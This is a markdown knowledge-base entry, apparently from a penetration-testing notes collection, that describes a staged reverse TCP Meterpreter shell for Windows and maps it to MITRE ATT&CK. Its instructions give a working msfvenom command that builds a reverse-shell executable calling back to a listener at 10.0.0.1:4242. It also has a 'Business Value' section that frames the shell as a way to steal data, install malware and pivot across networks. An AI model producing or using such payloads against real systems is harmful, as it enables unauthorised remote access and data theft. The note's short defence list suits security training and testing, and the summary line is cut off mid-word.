---
id: 0df64f5b-5bc3-45e3-b341-2d997c0ba2ab
name: Windows Staged Reverse TCP Meterpreter Shell
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.816975+00:00'
updated_at: '2023-04-10T20:25:22.096034+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
- '[[Obfuscated Files or Information|T1027 - Obfuscated Files or Information]]'
- '[[Standard Application Layer Protocol|T1071 - Standard Application Layer Protocol]]'
sub_techniques:
- '[[Web Protocols|T1071.001 - Web Protocols]]'
tags:
- '[[Meterpreter Shell]]'
- '[[Reverse Shell Cheat Sheet]]'
- '[[Windows Staged reverse TCP]]'
commands:
- '[[Create Windows Reverse TCP Meterpreter Payload]]'
---

# Windows Staged Reverse TCP Meterpreter Shell

## Summary

A staged reverse TCP Meterpreter shell is a type of reverse shell that is executed in two stages. The first stage is a small payload that establishes a connection with the attacker's machine, and the second stage is a more fully featured Meterpreter shell that is downloaded and executed by the firs

## Description

# Description

A staged reverse TCP Meterpreter shell is a type of reverse shell that is executed in two stages. The first stage is a small payload that establishes a connection with the attacker's machine, and the second stage is a more fully featured Meterpreter shell that is downloaded and executed by the first stage. This type of shell is useful when the attacker is unable to establish a direct connection to the target machine, for example if the target is behind a firewall or NAT device.

Technical Explanation: This procedure involves using a staged reverse TCP Meterpreter payload to establish a connection with the target machine. The first stage payload is designed to bypass any firewalls or other network security measures in place, and once a connection is established, the second stage Meterpreter shell is downloaded and executed on the target machine. This allows the attacker to gain full access to the target machine and perform a wide range of actions, including stealing data, installing malware, and pivoting to other machines on the network.

Business Value: This procedure is useful for attackers who want to gain access to a target machine that is behind a firewall or other network security measures. By using a staged reverse TCP Meterpreter shell, the attacker can bypass these measures and gain full access to the target machine, allowing them to steal data, install malware, and pivot to other machines on the network.

 

## Requirements

1. Access to a machine that can run the Metasploit Framework

1. Knowledge of the target's network architecture

 

## Defense

1. Implement network segmentation to limit the impact of a successful attack

1. Use strong authentication and access controls to limit unauthorized access to sensitive systems

1. Regularly monitor network traffic for signs of suspicious activity

 

## Objectives

1. Establish a connection with the target machine

1. Download and execute a Meterpreter shell on the target machine

1. Gain full access to the target machine

 

# Instructions

1. The 'msfvenom' command is used to generate payloads for various exploits. In this case, we are generating a payload for the 'windows/meterpreter/reverse_tcp' exploit. The 'LHOST' option specifies the IP address of the listener, and the 'LPORT' option specifies the port number. The '-f' option specifies the output format, which in this case is 'exe'. The output is then redirected to a file named 'reverse.exe'.

 



**Code**: [[msfvenom -p windows/meterpreter/reverse_tcp LHOST=]]



> This command generates a Windows executable payload that can be used to establish a reverse TCP connection to a listener. The payload can be used in conjunction with a Metasploit listener to gain remote access to a target machine. The 'LHOST' and 'LPORT' options should be set to the IP address and port number of the listener respectively. The generated payload should be transferred to the target machine and executed to establish the reverse TCP connection.



**Command** ([[Create Windows Reverse TCP Meterpreter Payload]]):

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
```



## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Defense Evasion|TA0005 - Defense Evasion]]

### Techniques

- [[Obfuscated Files or Information|T1027 - Obfuscated Files or Information]]
- [[Standard Application Layer Protocol|T1071 - Standard Application Layer Protocol]]

### Sub-Techniques

- [[Web Protocols|T1071.001 - Web Protocols]]

## Commands Used

- [[Create Windows Reverse TCP Meterpreter Payload]]

## Tags

- [[Meterpreter Shell]]
- [[Reverse Shell Cheat Sheet]]
- [[Windows Staged reverse TCP]]


